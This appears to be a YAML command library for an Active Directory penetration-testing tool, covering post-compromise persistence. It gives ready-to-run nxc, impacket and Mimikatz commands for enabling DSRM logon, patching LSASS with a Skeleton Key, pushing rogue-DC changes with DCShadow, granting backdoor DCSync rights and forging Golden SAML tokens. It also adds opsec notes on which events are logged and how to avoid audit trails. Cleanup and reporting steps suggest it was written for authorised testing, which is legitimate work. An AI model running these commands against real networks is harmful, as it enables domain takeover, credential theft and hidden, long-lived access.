      - label: "Enable DSRM network logon via registry"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f'"
      - label: "Authenticate using DSRM account"
        cmd: "nxc smb {DC_IP} -u 'Administrator' -p '{DSRM_PASSWORD}' --local-auth"
      - label: "PTH with DSRM hash"
        cmd: "impacket-secretsdump '{DC_HOSTNAME}/Administrator:{DSRM_PASSWORD}'@{DC_IP} --local-auth -just-dc-ntlm"
      - label: "Get DSRM hash from SAM (once local admin)"
        cmd: "nxc smb {DC_IP} -u 'Administrator' -p '{DSRM_PASSWORD}' --local-auth --sam"
    opsec: >
      Registry modification logged (4657). DSRM logon generates 4776 with
      logon type 3. Unusual for a DC to have local auth enabled — may alert.
      Very persistent — survives domain password resets and domain rejoins.
    cleanup:
      - label: "Disable DSRM network logon"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'reg delete HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /f'"

  - id: persist_skeleton_key
    name: Skeleton Key — LSASS Patch for Master Password
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [persistence, skeleton-key, mimikatz, lsass, master-password, volatile]
    description: >
      Patch LSASS on a DC to accept a master password ('mimikatz') in addition
      to the real password for any domain account. Allows authentication as any
      user without knowing their password. VOLATILE — lost on DC reboot. Use for
      demonstration/post-compromise access, not long-term persistence.
    commands:
      - label: "Inject skeleton key via Mimikatz (run as DA on DC)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Invoke-Mimikatz -Command \"privilege::debug misc::skeleton\"'"
      - label: "Verify — authenticate as any user with master password"
        cmd: "nxc smb {DC_IP} -u administrator -p 'mimikatz' -d {DOMAIN}"
      - label: "Alternative via impacket if you have DA"
        cmd: "impacket-psexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} 'mimikatz privilege::debug misc::skeleton exit'"
      - label: "Upload and run Mimikatz binary"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --put-file /opt/mimikatz.exe 'C:\\Windows\\Temp\\m.exe' && nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'C:\\Windows\\Temp\\m.exe \"privilege::debug\" \"misc::skeleton\" exit'"
    opsec: >
      LSASS modification — Sysmon Event 10 (process access). EDR will flag
      Mimikatz. This is very loud. Do not use in environments with EDR.
      Reboot of DC removes skeleton key. Document as finding, then remove.
    cleanup:
      - label: "Reboot DC to remove skeleton key (volatile — disappears on restart)"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'shutdown /r /t 30 /c Scheduled Maintenance'"
      - label: "Remove Mimikatz binary"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'del /f C:\\Windows\\Temp\\m.exe'"

  - id: persist_dcshadow
    name: DCShadow — Rogue DC for Stealth AD Modifications
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, TARGET_USER]
    requires_priv: da
    tags: [persistence, dcshadow, rogue-dc, replication, stealthy, mimikatz]
    description: >
      DCShadow temporarily registers a rogue Domain Controller to push arbitrary
      AD changes that bypass most security tooling and audit logs. Changes are
      replicated as legitimate DC replication — no 5136 object modification events.
      Use for SIDHistory injection, making accounts DA, or setting backdoor ACLs
      without leaving standard AD audit trails.
    commands:
      - label: "DCShadow — add target user to Domain Admins"
        cmd: "mimikatz # lsadump::dcshadow /object:{TARGET_USER} /attribute:primaryGroupID /value:512"
      - label: "DCShadow — inject SID history"
        cmd: "mimikatz # lsadump::dcshadow /object:{TARGET_USER} /attribute:SIDHistory /value:{DOMAIN_SID}-519"
      - label: "DCShadow — set user description to appear normal"
        cmd: "mimikatz # lsadump::dcshadow /object:{TARGET_USER} /attribute:description /value:'Standard User Account'"
      - label: "DCShadow push — run simultaneously in second terminal"
        cmd: "mimikatz # lsadump::dcshadow /push"
      - label: "DCShadow via impacket (remote — experimental)"
        cmd: "impacket-dcshadow -dc-ip {DC_IP} -u '{DOMAIN}/{USERNAME}' -p '{PASSWORD}' -attribute 'primaryGroupID' -value 512 -target {TARGET_USER}"
    opsec: >
      DCShadow bypasses 5136 (attribute change) events — changes appear as
      legitimate replication. MDI can detect spurious DC registration. Two
      terminals required simultaneously. Short window of exposure.
    cleanup:
      - label: "Reverse attribute changes via standard LDAP after DCShadow"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} # then use dacledit or ADSIEdit to revert"

  - id: persist_security_descriptor
    name: Security Descriptor Backdoor — Domain Object ACL
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [persistence, security-descriptor, domain-object, dcsync, acl, backdoor]
    description: >
      Grant DCSync rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
      directly on the domain object to a low-privileged account. That account can
      then run DCSync at any time in the future — even after DA accounts are rotated.
      The backdoor account appears as a normal user in AD.
    commands:
      - label: "Grant DCSync rights to backdoor account"
        cmd: "impacket-dacledit -action write -rights DCSync -principal '{TARGET_USER}' -target-dn 'DC=domain,DC=local' '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"
      - label: "Verify rights were applied"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M daclread -o TARGET='DC=domain,DC=local' PRINCIPAL='{TARGET_USER}' RIGHTS='*'"
      - label: "Test — DCSync with backdoor account"
        cmd: "impacket-secretsdump '{DOMAIN}/{TARGET_USER}:{PASSWORD}'@{DC_IP} -just-dc-ntlm"
      - label: "Grant full control on domain object (nuclear option)"
        cmd: "impacket-dacledit -action write -rights FullControl -principal '{TARGET_USER}' -target-dn 'DC=domain,DC=local' '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"
    opsec: >
      ACL modification on domain object logged (4662). BloodHound and MDI both
      detect DCSync rights granted to non-standard accounts. Use DCShadow to
      apply this change stealthily if needed.
    cleanup:
      - label: "Remove DCSync rights"
        cmd: "impacket-dacledit -action remove -rights DCSync -principal '{TARGET_USER}' -target-dn 'DC=domain,DC=local' '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"

  - id: persist_golden_saml
    name: Golden SAML — Forge SAML Tokens for Federated Services
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [persistence, golden-saml, adfs, saml, federation, azure, office365]
    description: >
      Extract the AD FS token signing certificate private key then forge SAML
      tokens for any user to access federated services (Azure AD, Office 365,
      Salesforce, AWS SAML, etc.). Survives domain password resets completely
      — valid until the AD FS certificate is rotated (default 1 year).
      The ultimate persistence in hybrid environments.
    commands:
      - label: "Find AD FS server"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(objectClass=serviceConnectionPoint)' 'keywords serviceBindingInformation' | grep -i adfs"
      - label: "Export AD FS token signing cert (requires local admin on ADFS)"
        cmd: "nxc smb {ADFS_SERVER} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Export-AdfsCertificate -CertificateType Token-Signing'"
      - label: "Get ADFS config via Golden SAML toolkit"
        cmd: "python3 ADFSDump.py -server {ADFS_SERVER} -domain {DOMAIN} -username {USERNAME} -password '{PASSWORD}'"
      - label: "Forge SAML token for any user"
        cmd: "python3 shimit.py -idp '{ADFS_SERVER}' -pk adfs_cert.pfx -sp 'urn:federation:MicrosoftOnline' -u 'administrator@{DOMAIN}' -role 'MSFT_Global_Admin' -id 'S-1-5-21-{DOMAIN_SID}-500'"
      - label: "Alternative — extract via DCSync if DKM key accessible"
        cmd: "impacket-secretsdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} -just-dc -outputfile /tmp/dcsync_dump"
    opsec: >
      ADFS certificate export logged on ADFS server. Golden SAML tokens bypass
      all password-based controls. MDI/Azure Sentinel may detect anomalous SAML
      token usage. Extremely persistent — survives AD resets.
    cleanup:
      - label: "Document for report — recommend ADFS cert rotation"
        cmd: "echo 'Recommend: Rotate ADFS Token Signing Certificate and audit ADFS access logs'"

